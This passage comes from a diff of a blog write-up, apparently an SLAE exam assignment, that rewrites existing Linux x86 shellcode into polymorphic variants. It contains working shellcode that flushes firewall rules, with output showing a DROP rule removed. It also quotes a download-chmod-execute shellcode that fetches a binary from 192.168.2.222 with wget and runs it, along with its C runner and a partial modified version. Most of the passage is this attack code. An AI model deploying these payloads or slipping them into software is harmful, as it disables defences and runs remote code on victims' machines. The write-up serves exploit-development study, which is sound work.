+</span></span></span><span class=line><span class=cl><span class=cm> * section .text
+</span></span></span><span class=line><span class=cl><span class=cm> *
+</span></span></span><span class=line><span class=cl><span class=cm> *      global _start
+</span></span></span><span class=line><span class=cl><span class=cm> *
+</span></span></span><span class=line><span class=cl><span class=cm> * _start:
+</span></span></span><span class=line><span class=cl><span class=cm> *
+</span></span></span><span class=line><span class=cl><span class=cm> * ; execve(&#34;/sbin/ipchains&#34;, { &#34;/sbin/ipchains&#34;, &#34;-F&#34;, NULL }, NULL)
+</span></span></span><span class=line><span class=cl><span class=cm> *
+</span></span></span><span class=line><span class=cl><span class=cm> *      push byte 11
+</span></span></span><span class=line><span class=cl><span class=cm> *      pop eax
+</span></span></span><span class=line><span class=cl><span class=cm> *      cdq
+</span></span></span><span class=line><span class=cl><span class=cm> *      push edx
+</span></span></span><span class=line><span class=cl><span class=cm> *      push word 0x462d
+</span></span></span><span class=line><span class=cl><span class=cm> *      mov ecx, esp
+</span></span></span><span class=line><span class=cl><span class=cm> *      push edx
+</span></span></span><span class=line><span class=cl><span class=cm> *      push word 0x736e
+</span></span></span><span class=line><span class=cl><span class=cm> *      push 0x69616863
+</span></span></span><span class=line><span class=cl><span class=cm> *      push 0x70692f6e
+</span></span></span><span class=line><span class=cl><span class=cm> *      push 0x6962732f
+</span></span></span><span class=line><span class=cl><span class=cm> *      mov ebx, esp
+</span></span></span><span class=line><span class=cl><span class=cm> *      push edx
+</span></span></span><span class=line><span class=cl><span class=cm> *      push ecx
+</span></span></span><span class=line><span class=cl><span class=cm> *      push ebx
+</span></span></span><span class=line><span class=cl><span class=cm> *      mov ecx, esp
+</span></span></span><span class=line><span class=cl><span class=cm> *      int 0x80
+</span></span></span><span class=line><span class=cl><span class=cm> */</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>main</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>       <span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span>
+</span></span><span class=line><span class=cl>               <span class=s>&#34;</span><span class=se>\x6a\x0b\x58\x99\x52\x66\x68\x2d\x46\x89</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl>               <span class=s>&#34;</span><span class=se>\xe1\x52\x66\x68\x6e\x73\x68\x63\x68\x61</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl>               <span class=s>&#34;</span><span class=se>\x69\x68\x6e\x2f\x69\x70\x68\x2f\x73\x62</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl>               <span class=s>&#34;</span><span class=se>\x69\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80</span><span class=s>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>       <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=p>)())</span> <span class=n>shellcode</span><span class=p>)();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Because I don&rsquo;t have the command <code>ipchains</code> on my system, I cheated a little bit and created the following script in <code>/sbin/ipchains</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=cp>#!/bin/bash
-</span><span class=cp></span>
-/sbin/iptables <span class=s2>&#34;</span><span class=nv>$@</span><span class=s2>&#34;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>The modified shellcode can be seen below. Comments starting with <code>[M]</code> indicates that the instruction has been modified.</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl>/sbin/iptables <span class=s2>&#34;</span><span class=nv>$@</span><span class=s2>&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>The modified shellcode can be seen below. Comments starting with <code>[M]</code> indicates that the instruction has been modified.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -400,41 +288,36 @@ shutdown: Need to be root
 </span><span class=lnt>27
 </span><span class=lnt>28
 </span><span class=lnt>29
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=nf>section</span> <span class=no>.text</span>
-
-<span class=nf>global</span> <span class=no>_start</span>
-
-<span class=nl>_start:</span>
-    <span class=nf>xor</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>ecx</span>            <span class=c>; [M] zero out ecx
-</span><span class=c></span>    <span class=no>mul</span> <span class=no>ecx</span>                 <span class=c>; [M] zero out edx and eax
-</span><span class=c></span>    <span class=no>push</span> <span class=no>byte</span> <span class=mi>10</span>            <span class=c>; [M]
-</span><span class=c></span>    <span class=no>pop</span> <span class=no>eax</span>                 <span class=c>; eax = 10
-</span><span class=c></span>    <span class=no>push</span> <span class=no>ecx</span>                <span class=c>; push ecx instead of edx
-</span><span class=c></span>    <span class=no>push</span> <span class=mi>0x2d</span>               <span class=c>; [M] &#34;-&#34; char
-</span><span class=c></span>    <span class=no>mov</span> <span class=no>byte</span> <span class=p>[</span><span class=no>esp</span><span class=err>+</span><span class=mi>1</span><span class=p>],</span> <span class=mi>0x46</span>  <span class=c>; [M] &#34;F&#34; char
-</span><span class=c></span>    <span class=no>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>esp</span>            <span class=c>; save current stack pointer to ecx
-</span><span class=c></span>    <span class=no>push</span> <span class=no>edx</span>                <span class=c>; push null
-</span><span class=c></span>    <span class=no>push</span> <span class=no>word</span> <span class=mi>0x736e</span>        <span class=c>; following 4 push instructions form /sbin/ipchains
-</span><span class=c></span>    <span class=no>push</span> <span class=mi>0x69616863</span>
-    <span class=nf>push</span> <span class=mi>0x70692f6e</span>
-    <span class=nf>push</span> <span class=mi>0x6962732f</span>
-    <span class=nf>push</span> <span class=mi>0xdeadbeef</span>         <span class=c>; [M] add some nonsese
-</span><span class=c></span>    <span class=no>pop</span> <span class=no>edi</span>                 <span class=c>; [M]
-</span><span class=c></span>    <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span> <span class=no>esp</span>            <span class=c>; save currrent stack pointer to ebx
-</span><span class=c></span>    <span class=no>push</span> <span class=no>edx</span>                <span class=c>; push null
-</span><span class=c></span>    <span class=no>push</span> <span class=no>ecx</span>                <span class=c>; points to &#34;-F&#34;
-</span><span class=c></span>    <span class=no>push</span> <span class=no>ebx</span>                <span class=c>; points to /sbin/ipchains
-</span><span class=c></span>    <span class=no>xor</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>ecx</span>            <span class=c>; [M] add some nonsense
-</span><span class=c></span>    <span class=no>mov</span> <span class=no>edi</span><span class=p>,</span> <span class=no>esp</span>            <span class=c>; [M] add some nonsense
-</span><span class=c></span>    <span class=no>xchg</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>edi</span>           <span class=c>; [M] save current stack pointer to ecx
-</span><span class=c></span>    <span class=no>inc</span> <span class=no>eax</span>                 <span class=c>; [M] syscall 11: execve()
-</span><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>                <span class=c>; execute syscall
-</span></code></pre></td></tr></table>
-</div>
-</div><p>The output below shows how the shellcode deletes a <code>DROP</code> rule from iptables:</p>
-<pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_6$ sudo iptables -L
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>section</span> <span class=no>.text</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nf>global</span> <span class=no>_start</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nl>_start:</span>
+</span></span><span class=line><span class=cl>    <span class=nf>xor</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>ecx</span>            <span class=c>; [M] zero out ecx
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mul</span> <span class=no>ecx</span>                 <span class=c>; [M] zero out edx and eax
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=no>byte</span> <span class=mi>10</span>            <span class=c>; [M]
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>pop</span> <span class=no>eax</span>                 <span class=c>; eax = 10
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=no>ecx</span>                <span class=c>; push ecx instead of edx
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=mi>0x2d</span>               <span class=c>; [M] &#34;-&#34; char
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>byte</span> <span class=p>[</span><span class=no>esp</span><span class=err>+</span><span class=mi>1</span><span class=p>],</span> <span class=mi>0x46</span>  <span class=c>; [M] &#34;F&#34; char
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>esp</span>            <span class=c>; save current stack pointer to ecx
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=no>edx</span>                <span class=c>; push null
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=no>word</span> <span class=mi>0x736e</span>        <span class=c>; following 4 push instructions form /sbin/ipchains
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=mi>0x69616863</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mi>0x70692f6e</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mi>0x6962732f</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mi>0xdeadbeef</span>         <span class=c>; [M] add some nonsese
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>pop</span> <span class=no>edi</span>                 <span class=c>; [M]
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span> <span class=no>esp</span>            <span class=c>; save currrent stack pointer to ebx
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=no>edx</span>                <span class=c>; push null
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=no>ecx</span>                <span class=c>; points to &#34;-F&#34;
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=no>ebx</span>                <span class=c>; points to /sbin/ipchains
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>xor</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>ecx</span>            <span class=c>; [M] add some nonsense
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>edi</span><span class=p>,</span> <span class=no>esp</span>            <span class=c>; [M] add some nonsense
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>xchg</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>edi</span>           <span class=c>; [M] save current stack pointer to ecx
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>inc</span> <span class=no>eax</span>                 <span class=c>; [M] syscall 11: execve()
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>                <span class=c>; execute syscall
+</span></span></span></code></pre></td></tr></table></div></div><p>The output below shows how the shellcode deletes a <code>DROP</code> rule from iptables:</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_6$ sudo iptables -L
 Chain INPUT (policy ACCEPT)
 target     prot opt source               destination
 DROP       all  --  192.168.1.254        anywhere
@@ -455,12 +338,7 @@ target     prot opt source               destination
 
 Chain OUTPUT (policy ACCEPT)
 target     prot opt source               destination
-</code></pre><p>The modified shellcode increased with 17 bytes which is a 42% increase.</p>
-<h2 id=shellcode-3-download--chmod--exec---108-bytes>Shellcode 3: Download + chmod + exec - 108 bytes</h2>
-<p>The next and final shellcode is a little bit bigger than the previous samples. Let&rsquo;s begin modifying it!</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</code></pre><p>The modified shellcode increased with 17 bytes which is a 42% increase.</p><h2 id=shellcode-3-download--chmod--exec---108-bytes>Shellcode 3: Download + chmod + exec - 108 bytes</h2><p>The next and final shellcode is a little bit bigger than the previous samples. Let&rsquo;s begin modifying it!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -555,109 +433,102 @@ target     prot opt source               destination
 </span><span class=lnt>93
 </span><span class=lnt>94
 </span><span class=lnt>95
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cm>/*
-</span><span class=cm>; Filename: downloadexec.nasm
-</span><span class=cm>; Author: Daniel Sauder
-</span><span class=cm>; Website: http://govolution.wordpress.com/
-</span><span class=cm>; Tested on: Ubuntu 12.04 / 32Bit
-</span><span class=cm>; License: http://creativecommons.org/licenses/by-sa/3.0/
-</span><span class=cm>
-</span><span class=cm>; Shellcode:
-</span><span class=cm>; - download 192.168.2.222/x with wget
-</span><span class=cm>; - chmod x
-</span><span class=cm>; - execute x
-</span><span class=cm>; - x is an executable
-</span><span class=cm>; - length 108 bytes
-</span><span class=cm>
-</span><span class=cm>global _start
-</span><span class=cm>
-</span><span class=cm>section .text
-</span><span class=cm>
-</span><span class=cm>_start:
-</span><span class=cm>
-</span><span class=cm>    ;fork
-</span><span class=cm>    xor eax,eax
-</span><span class=cm>    mov al,0x2
-</span><span class=cm>    int 0x80
-</span><span class=cm>    xor ebx,ebx
-</span><span class=cm>    cmp eax,ebx
-</span><span class=cm>    jz child
-</span><span class=cm>  
-</span><span class=cm>    ;wait(NULL)
-</span><span class=cm>    xor eax,eax
-</span><span class=cm>    mov al,0x7
-</span><span class=cm>    int 0x80
-</span><span class=cm>        
-</span><span class=cm>    ;chmod x
-</span><span class=cm>    xor ecx,ecx
-</span><span class=cm>    xor eax, eax
-</span><span class=cm>    push eax
-</span><span class=cm>    mov al, 0xf
-</span><span class=cm>    push 0x78
-</span><span class=cm>    mov ebx, esp
-</span><span class=cm>    xor ecx, ecx
-</span><span class=cm>    mov cx, 0x1ff
-</span><span class=cm>    int 0x80
-</span><span class=cm>    
-</span><span class=cm>    ;exec x
-</span><span class=cm>    xor eax, eax
-</span><span class=cm>    push eax
-</span><span class=cm>    push 0x78
-</span><span class=cm>    mov ebx, esp
-</span><span class=cm>    push eax
-</span><span class=cm>    mov edx, esp
-</span><span class=cm>    push ebx
-</span><span class=cm>    mov ecx, esp
-</span><span class=cm>    mov al, 11
-</span><span class=cm>    int 0x80
-</span><span class=cm>    
-</span><span class=cm>child:
-</span><span class=cm>    ;download 192.168.2.222//x with wget
-</span><span class=cm>    push 0xb
-</span><span class=cm>    pop eax
-</span><span class=cm>    cdq
-</span><span class=cm>    push edx
-</span><span class=cm>    
-</span><span class=cm>    push 0x782f2f32 ;2//x avoid null byte
-</span><span class=cm>    push 0x32322e32 ;22.2
-</span><span class=cm>    push 0x2e383631 ;.861
-</span><span class=cm>    push 0x2e323931 ;.291
-</span><span class=cm>    mov ecx,esp
-</span><span class=cm>    push edx
-</span><span class=cm>    
-</span><span class=cm>    push 0x74 ;t
-</span><span class=cm>    push 0x6567772f ;egw/
-</span><span class=cm>    push 0x6e69622f ;nib/
-</span><span class=cm>    push 0x7273752f ;rsu/
-</span><span class=cm>    mov ebx,esp
-</span><span class=cm>    push edx
-</span><span class=cm>    push ecx
-</span><span class=cm>    push ebx
-</span><span class=cm>    mov ecx,esp
-</span><span class=cm>    int 0x80
-</span><span class=cm>    
-</span><span class=cm>*/</span>
-
-<span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
-</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
-</span><span class=cp></span>
-<span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>code</span><span class=p>[]</span> <span class=o>=</span> \
-<span class=s>&#34;</span><span class=se>\x31\xc0\xb0\x02\xcd\x80\x31\xdb\x39\xd8\x74\x2a\x31\xc0\xb0\x07\xcd\x80\x31\xc9\x31\xc0\x50\xb0\x0f\x6a\x78\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x31\xc0\x50\x6a\x78\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x6a\x0b\x58\x99\x52\x68\x32\x2f\x2f\x78\x68\x32\x2e\x32\x32\x68\x31\x36\x38\x2e\x68\x31\x39\x32\x2e\x89\xe1\x52\x6a\x74\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80</span><span class=s>&#34;</span><span class=p>;</span>
-
-<span class=n>main</span><span class=p>()</span>
-<span class=p>{</span>
-    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Shellcode Length:  %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>strlen</span><span class=p>(</span><span class=n>code</span><span class=p>));</span>
-    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>ret</span><span class=p>)()</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>(</span><span class=o>*</span><span class=p>)())</span><span class=n>code</span><span class=p>;</span>
-    <span class=n>ret</span><span class=p>();</span>
-<span class=p>}</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>Let&rsquo;s go!</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/*
+</span></span></span><span class=line><span class=cl><span class=cm>; Filename: downloadexec.nasm
+</span></span></span><span class=line><span class=cl><span class=cm>; Author: Daniel Sauder
+</span></span></span><span class=line><span class=cl><span class=cm>; Website: http://govolution.wordpress.com/
+</span></span></span><span class=line><span class=cl><span class=cm>; Tested on: Ubuntu 12.04 / 32Bit
+</span></span></span><span class=line><span class=cl><span class=cm>; License: http://creativecommons.org/licenses/by-sa/3.0/
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>; Shellcode:
+</span></span></span><span class=line><span class=cl><span class=cm>; - download 192.168.2.222/x with wget
+</span></span></span><span class=line><span class=cl><span class=cm>; - chmod x
+</span></span></span><span class=line><span class=cl><span class=cm>; - execute x
+</span></span></span><span class=line><span class=cl><span class=cm>; - x is an executable
+</span></span></span><span class=line><span class=cl><span class=cm>; - length 108 bytes
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>global _start
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>section .text
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>_start:
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>    ;fork
+</span></span></span><span class=line><span class=cl><span class=cm>    xor eax,eax
+</span></span></span><span class=line><span class=cl><span class=cm>    mov al,0x2
+</span></span></span><span class=line><span class=cl><span class=cm>    int 0x80
+</span></span></span><span class=line><span class=cl><span class=cm>    xor ebx,ebx
+</span></span></span><span class=line><span class=cl><span class=cm>    cmp eax,ebx
+</span></span></span><span class=line><span class=cl><span class=cm>    jz child
+</span></span></span><span class=line><span class=cl><span class=cm>  
+</span></span></span><span class=line><span class=cl><span class=cm>    ;wait(NULL)
+</span></span></span><span class=line><span class=cl><span class=cm>    xor eax,eax
+</span></span></span><span class=line><span class=cl><span class=cm>    mov al,0x7
+</span></span></span><span class=line><span class=cl><span class=cm>    int 0x80
+</span></span></span><span class=line><span class=cl><span class=cm>        
+</span></span></span><span class=line><span class=cl><span class=cm>    ;chmod x
+</span></span></span><span class=line><span class=cl><span class=cm>    xor ecx,ecx
+</span></span></span><span class=line><span class=cl><span class=cm>    xor eax, eax
+</span></span></span><span class=line><span class=cl><span class=cm>    push eax
+</span></span></span><span class=line><span class=cl><span class=cm>    mov al, 0xf
+</span></span></span><span class=line><span class=cl><span class=cm>    push 0x78
+</span></span></span><span class=line><span class=cl><span class=cm>    mov ebx, esp
+</span></span></span><span class=line><span class=cl><span class=cm>    xor ecx, ecx
+</span></span></span><span class=line><span class=cl><span class=cm>    mov cx, 0x1ff
+</span></span></span><span class=line><span class=cl><span class=cm>    int 0x80
+</span></span></span><span class=line><span class=cl><span class=cm>    
+</span></span></span><span class=line><span class=cl><span class=cm>    ;exec x
+</span></span></span><span class=line><span class=cl><span class=cm>    xor eax, eax
+</span></span></span><span class=line><span class=cl><span class=cm>    push eax
+</span></span></span><span class=line><span class=cl><span class=cm>    push 0x78
+</span></span></span><span class=line><span class=cl><span class=cm>    mov ebx, esp
+</span></span></span><span class=line><span class=cl><span class=cm>    push eax
+</span></span></span><span class=line><span class=cl><span class=cm>    mov edx, esp
+</span></span></span><span class=line><span class=cl><span class=cm>    push ebx
+</span></span></span><span class=line><span class=cl><span class=cm>    mov ecx, esp
+</span></span></span><span class=line><span class=cl><span class=cm>    mov al, 11
+</span></span></span><span class=line><span class=cl><span class=cm>    int 0x80
+</span></span></span><span class=line><span class=cl><span class=cm>    
+</span></span></span><span class=line><span class=cl><span class=cm>child:
+</span></span></span><span class=line><span class=cl><span class=cm>    ;download 192.168.2.222//x with wget
+</span></span></span><span class=line><span class=cl><span class=cm>    push 0xb
+</span></span></span><span class=line><span class=cl><span class=cm>    pop eax
+</span></span></span><span class=line><span class=cl><span class=cm>    cdq
+</span></span></span><span class=line><span class=cl><span class=cm>    push edx
+</span></span></span><span class=line><span class=cl><span class=cm>    
+</span></span></span><span class=line><span class=cl><span class=cm>    push 0x782f2f32 ;2//x avoid null byte
+</span></span></span><span class=line><span class=cl><span class=cm>    push 0x32322e32 ;22.2
+</span></span></span><span class=line><span class=cl><span class=cm>    push 0x2e383631 ;.861
+</span></span></span><span class=line><span class=cl><span class=cm>    push 0x2e323931 ;.291
+</span></span></span><span class=line><span class=cl><span class=cm>    mov ecx,esp
+</span></span></span><span class=line><span class=cl><span class=cm>    push edx
+</span></span></span><span class=line><span class=cl><span class=cm>    
+</span></span></span><span class=line><span class=cl><span class=cm>    push 0x74 ;t
+</span></span></span><span class=line><span class=cl><span class=cm>    push 0x6567772f ;egw/
+</span></span></span><span class=line><span class=cl><span class=cm>    push 0x6e69622f ;nib/
+</span></span></span><span class=line><span class=cl><span class=cm>    push 0x7273752f ;rsu/
+</span></span></span><span class=line><span class=cl><span class=cm>    mov ebx,esp
+</span></span></span><span class=line><span class=cl><span class=cm>    push edx
+</span></span></span><span class=line><span class=cl><span class=cm>    push ecx
+</span></span></span><span class=line><span class=cl><span class=cm>    push ebx
+</span></span></span><span class=line><span class=cl><span class=cm>    mov ecx,esp
+</span></span></span><span class=line><span class=cl><span class=cm>    int 0x80
+</span></span></span><span class=line><span class=cl><span class=cm>    
+</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>code</span><span class=p>[]</span> <span class=o>=</span> \
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x31\xc0\xb0\x02\xcd\x80\x31\xdb\x39\xd8\x74\x2a\x31\xc0\xb0\x07\xcd\x80\x31\xc9\x31\xc0\x50\xb0\x0f\x6a\x78\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x31\xc0\x50\x6a\x78\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x6a\x0b\x58\x99\x52\x68\x32\x2f\x2f\x78\x68\x32\x2e\x32\x32\x68\x31\x36\x38\x2e\x68\x31\x39\x32\x2e\x89\xe1\x52\x6a\x74\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80</span><span class=s>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>main</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Shellcode Length:  %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>strlen</span><span class=p>(</span><span class=n>code</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>ret</span><span class=p>)()</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>(</span><span class=o>*</span><span class=p>)())</span><span class=n>code</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>ret</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s go!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -727,93 +598,77 @@ target     prot opt source               destination
 </span><span class=lnt>68
 </span><span class=lnt>69
 </span><span class=lnt>70
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=nf>global</span> <span class=no>_start</span>
-
-<span class=nf>section</span> <span class=no>.text</span>
-
-<span class=nl>_start:</span>
-
-    <span class=c>;fork
-</span><span class=c></span>    <span class=nf>xor</span> <span class=no>ecx</span><span class=p>,</span><span class=no>ecx</span>         <span class=c>; [M] zero ecx instead of eax
-</span><span class=c></span>    <span class=no>mul</span> <span class=no>ecx</span>             <span class=c>; [M] set eax and edx to zero
-</span><span class=c></span>    <span class=no>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0x1</span>         <span class=c>; [M]
-</span><span class=c></span>    <span class=no>inc</span> <span class=no>al</span>              <span class=c>; [M] fork syscall
-</span><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>            <span class=c>; execute syscall
-</span><span class=c></span>    <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span><span class=no>edx</span>         <span class=c>; [M] mov edx into ebx instead of xor ebx,ebx
-</span><span class=c></span>    <span class=no>cmp</span> <span class=no>eax</span><span class=p>,</span><span class=no>ebx</span>
-    <span class=nf>jz</span> <span class=no>child</span>
-
-    <span class=c>;wait(NULL)
-</span><span class=c></span>    <span class=nf>xor</span> <span class=no>eax</span><span class=p>,</span><span class=no>eax</span>
-    <span class=nf>mov</span> <span class=no>al</span><span class=p>,</span><span class=mi>0x8</span>          <span class=c>; [M]
-</span><span class=c></span>    <span class=no>dec</span> <span class=no>al</span>              <span class=c>; [M] waitpid syscall
-</span><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>            <span class=c>; execute syscall
-</span><span class=c></span>
-    <span class=c>;chmod x
-</span><span class=c></span>    <span class=c>;xor ecx,ecx        ; this can be removed
-</span><span class=c></span>    <span class=nf>xor</span> <span class=no>eax</span><span class=p>,</span> <span class=no>eax</span>        <span class=c>; zero out eax
-</span><span class=c></span>    <span class=no>push</span> <span class=no>edx</span>            <span class=c>; [M] push edx instead of eax, null byte
-</span><span class=c></span>    <span class=no>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0xf</span>         <span class=c>; chmod syscall
-</span><span class=c></span>    <span class=no>push</span> <span class=mi>0x78</span>           <span class=c>; &#34;x&#34; character
-</span><span class=c></span>    <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span> <span class=no>esp</span>        <span class=c>; set current stack pointer to ebx
-</span><span class=c></span>    <span class=no>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>edx</span>        <span class=c>; [M] mov ecx,edx instead of xor ecx,ecx
-</span><span class=c></span>    <span class=no>mov</span> <span class=no>cx</span><span class=p>,</span> <span class=mi>0x1ff</span>       <span class=c>; set chmod mode to 511
-</span><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>            <span class=c>; execute syscall
-</span><span class=c></span>
-    <span class=c>;exec x
-</span><span class=c></span>    <span class=c>;xor eax, eax       ; this can be removed
-</span><span class=c></span>    <span class=nf>push</span> <span class=no>edx</span>            <span class=c>; [M] push edx instead of eax
-</span><span class=c></span>    <span class=no>push</span> <span class=mi>0x78</span>           <span class=c>; &#34;x&#34; character
-</span><span class=c></span>    <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span> <span class=no>esp</span>        <span class=c>; set current stack pointer to ebx
